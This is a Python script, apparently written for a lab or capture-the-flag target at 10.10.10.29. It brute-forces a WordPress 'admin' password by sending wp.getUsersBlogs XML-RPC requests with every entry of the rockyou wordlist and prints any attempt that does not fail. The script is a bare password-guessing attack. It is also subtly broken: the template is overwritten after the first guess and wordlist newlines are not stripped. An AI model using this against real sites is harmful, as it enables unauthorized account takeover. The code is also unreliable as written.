import requests


passwords = "/usr/share/wordlists/rockyou.txt"

xml = """<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>{password}</value></param>
</params>
</methodCall>"""

headers = {'Content-type': 'application/xml'}

with open(passwords, encoding='latin-1') as f:
	data = f.readlines()
	for word in data:
		xml = xml.format(password=word)
		res = requests.post('http://10.10.10.29/wordpress/xmlrpc.php', data=xml, headers=headers).text
		if "Incorrect username or password" not in res:
			print(word)
			print(res)
print("DONE")
